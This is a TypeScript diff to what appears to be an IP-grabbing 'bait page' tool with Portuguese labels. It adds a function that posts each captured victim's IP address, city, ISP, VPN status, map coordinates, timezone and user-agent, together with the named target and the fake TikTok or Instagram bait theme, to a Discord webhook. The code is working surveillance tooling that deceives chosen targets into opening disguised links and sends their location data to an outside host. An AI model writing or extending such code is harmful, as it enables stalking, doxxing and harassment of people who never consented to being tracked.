@@ -176,6 +176,59 @@ function buildLoadingPage(theme: ThemeConfig): string {
 </html>`;
 }
 
+// ── Discord capture webhook ────────────────────────────────────────────────────
+// Set CAPTURE_WEBHOOK_URL env var to get instant Discord notifications on every IP capture
+const CAPTURE_WEBHOOK_URL = process.env.CAPTURE_WEBHOOK_URL ?? "";
+
+async function notifyCaptureWebhook(entry: TrackEntry): Promise<void> {
+  if (!CAPTURE_WEBHOOK_URL) return;
+  try {
+    const FLAG_MAP: Record<string, string> = {
+      US: "🇺🇸", BR: "🇧🇷", GB: "🇬🇧", DE: "🇩🇪", FR: "🇫🇷", RU: "🇷🇺", CN: "🇨🇳",
+      IN: "🇮🇳", JP: "🇯🇵", KR: "🇰🇷", CA: "🇨🇦", AU: "🇦🇺", MX: "🇲🇽", AR: "🇦🇷",
+      PT: "🇵🇹", ES: "🇪🇸", IT: "🇮🇹", NL: "🇳🇱", PL: "🇵🇱", TR: "🇹🇷",
+    };
+    const flag = (entry.countryCode && FLAG_MAP[entry.countryCode]) ? FLAG_MAP[entry.countryCode] : "🌐";
+    const theme_labels: Record<string, string> = {
+      tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
+      x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord", plain: "🔗 Direto",
+    };
+
+    const embed = {
+      title: "🎯 IP CAPTURADO — GEASS INTELLIGENCE",
+      description: `*"O Geass vê tudo. Ninguém escapa do meu olho absoluto."*`,
+      color: 0x9B59B6,
+      fields: [
+        { name: "🎭 Tema do Bait", value: theme_labels[entry.theme] ?? entry.theme, inline: true },
+        { name: "🎯 Alvo", value: `\`${entry.targetName ?? "desconhecido"}\``, inline: true },
+        { name: "📊 Hit #", value: `\`${entry.hits ?? 1}\``, inline: true },
+        { name: "📡 IP Capturado", value: `\`${entry.capturedIp ?? "?"}\``, inline: true },
+        { name: `${flag} Localização`, value: [entry.city, entry.region, entry.country].filter(Boolean).join(", ") || "N/A", inline: true },
+        { name: "🏢 ISP", value: entry.isp ?? "N/A", inline: true },
+        { name: "🔒 VPN/Proxy", value: entry.isProxy ? "✅ SIM" : "❌ Não", inline: true },
+        { name: "📱 Mobile", value: entry.mobile ? "✅ Sim" : "❌ Não", inline: true },
+        { name: "🕐 Fuso", value: entry.timezone ?? "N/A", inline: true },
+        { name: "🗺️ Coords", value: (entry.lat && entry.lon) ? `[${entry.lat}, ${entry.lon}](https://maps.google.com/?q=${entry.lat},${entry.lon})` : "N/A", inline: true },
+        { name: "🔑 Token", value: `\`${entry.token.slice(0, 12)}...\``, inline: true },
+        { name: "📊 Ver resultado", value: `\`/panel ipcheck token:${entry.token}\``, inline: false },
+      ],
+      footer: { text: `Geass Intelligence Division • IP Tracker v2 — ${new Date().toISOString()}` },
+      timestamp: new Date().toISOString(),
+    };
+
+    if (entry.userAgent) {
+      embed.fields.push({ name: "🖥️ User-Agent", value: `\`\`\`${entry.userAgent.slice(0, 150)}\`\`\``, inline: false });
+    }
+
+    await fetch(CAPTURE_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Geass Intelligence", embeds: [embed] }),
+      signal: AbortSignal.timeout(5000),
+    });
+  } catch { /* non-fatal — webhook failure must never break the bait page */ }
+}
+
 // ── Store & persistence ──────────────────────────────────────────────────────
 export interface TrackEntry {
   token:       string;
@@ -340,6 +393,8 @@ async function handleBaitRoute(
     entry.userAgent  = ua;
     Object.assign(entry, geo);
     console.log(`[IP TRACKER] 🎯 Captured ${rawIp} (${entry.country ?? "??"}) via ${themeKey} theme — token: ${token.slice(0, 8)}...`);
+    // Fire Discord webhook notification (non-blocking)
+    void notifyCaptureWebhook(entry);
   }
 
   saveStore();
